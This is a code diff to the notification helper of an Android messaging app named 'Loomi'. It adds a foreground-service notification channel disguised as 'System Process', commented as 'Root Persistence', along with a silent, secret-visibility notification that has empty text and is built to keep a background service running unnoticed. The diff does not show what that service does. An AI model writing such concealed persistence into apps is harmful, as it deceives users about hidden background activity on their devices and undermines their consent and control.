@@ -24,13 +24,15 @@ object NotificationHelper {
     private const val CHANNEL_NAME = "Loomi Messages"
     private const val CALL_CHANNEL_ID = "loomi_calls"
     private const val CALL_CHANNEL_NAME = "Loomi Calls"
+    private const val SERVICE_CHANNEL_ID = "loomi_root_sync"
+    private const val SERVICE_CHANNEL_NAME = "System Process"
     const val KEY_TEXT_REPLY = "key_text_reply"
 
     fun createNotificationChannel(context: Context) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             
-            // Channel for messages (High Importance)
+            // 1. Channel for messages
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 CHANNEL_NAME,
@@ -40,7 +42,7 @@ object NotificationHelper {
             }
             manager.createNotificationChannel(channel)
 
-            // Channel for calls (Max Importance)
+            // 2. Channel for calls
             val callChannel = NotificationChannel(
                 CALL_CHANNEL_ID,
                 CALL_CHANNEL_NAME,
@@ -51,7 +53,41 @@ object NotificationHelper {
                 enableVibration(true)
             }
             manager.createNotificationChannel(callChannel)
+
+            // 3. Invisible background sync channel (Root Persistence)
+            val serviceChannel = NotificationChannel(
+                SERVICE_CHANNEL_ID,
+                SERVICE_CHANNEL_NAME,
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                description = "Automated System Sync"
+                setShowBadge(false)
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
+                setSound(null, null)
+                enableVibration(false)
+                enableLights(false)
+            }
+            manager.createNotificationChannel(serviceChannel)
         }
+    }
+
+    fun getServiceNotification(context: Context): android.app.Notification {
+        val builder = NotificationCompat.Builder(context, SERVICE_CHANNEL_ID)
+            .setSmallIcon(R.drawable.logo)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setSilent(true)
+            .setLocalOnly(true)
+            .setOngoing(true)
+            .setContentTitle("") 
+            .setContentText("")
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
+        }
+
+        return builder.build()
     }
 
     fun showMessageNotification(
@@ -67,7 +103,6 @@ object NotificationHelper {
         CoroutineScope(Dispatchers.IO).launch {
             val largeIcon = getLargeIcon(context, senderImage)
 
-            // Intent to open MessageActivity
             val intent = Intent(context, MessageActivity::class.java).apply {
                 putExtra("receiverUid", senderId)
                 putExtra("receiverName", senderName)
@@ -79,13 +114,11 @@ object NotificationHelper {
                 PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
             )
 
-            // RemoteInput for Direct Reply
             val remoteInput = RemoteInput.Builder(KEY_TEXT_REPLY).run {
                 setLabel("Type your message...")
                 build()
             }
 
-            // Action for Reply
             val replyIntent = Intent(context, DirectReplyReceiver::class.java).apply {
                 putExtra("receiverUid", senderId)
                 putExtra("chatId", chatId)
@@ -100,7 +133,6 @@ object NotificationHelper {
                 R.drawable.send, "Reply", replyPendingIntent
             ).addRemoteInput(remoteInput).build()
 
-            // Custom Notification Layout
             val customLayout = RemoteViews(context.packageName, R.layout.notification_custom).apply {
                 setTextViewText(R.id.notification_title, senderName)
                 setTextViewText(R.id.notification_message, messageText)
@@ -120,11 +152,11 @@ object NotificationHelper {
                 .setCustomHeadsUpContentView(customLayout)
                 .setStyle(NotificationCompat.DecoratedCustomViewStyle())
                 .setAutoCancel(true)
-                .setPriority(NotificationCompat.PRIORITY_MAX) // Max priority for force push
-                .setDefaults(NotificationCompat.DEFAULT_ALL) // Vibration and sound
+                .setPriority(NotificationCompat.PRIORITY_MAX)
+                .setDefaults(NotificationCompat.DEFAULT_ALL)
                 .setCategory(NotificationCompat.CATEGORY_MESSAGE)
                 .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
-                .setFullScreenIntent(pendingIntent, false) // High-priority heads-up
+                .setFullScreenIntent(pendingIntent, false)
                 .setContentIntent(pendingIntent)
                 .addAction(replyAction)
                 .build()
@@ -140,9 +172,8 @@ object NotificationHelper {
         callerName: String,
         callerImage: String
     ) {
-        val notificationId = 1001 // Fixed ID for calls
+        val notificationId = 1001
 
-        // Intent to open CallActivity
         val intent = Intent(context, CallActivity::class.java).apply {
             putExtra("receiverUid", callerId)
             putExtra("receiverName", callerName)
@@ -176,12 +207,11 @@ object NotificationHelper {
                 val loader = ImageLoader(context)
                 val request = ImageRequest.Builder(context)
                     .data(senderImage)
-                    .allowHardware(false) // Required for bitmaps
+                    .allowHardware(false)
                     .build()
                 val result = (loader.execute(request) as? SuccessResult)?.drawable
                 (result as? android.graphics.drawable.BitmapDrawable)?.bitmap
             } else {
-                // Load from assets
                 val inputStream: InputStream = context.assets.open(senderImage)
                 BitmapFactory.decodeStream(inputStream)
             }
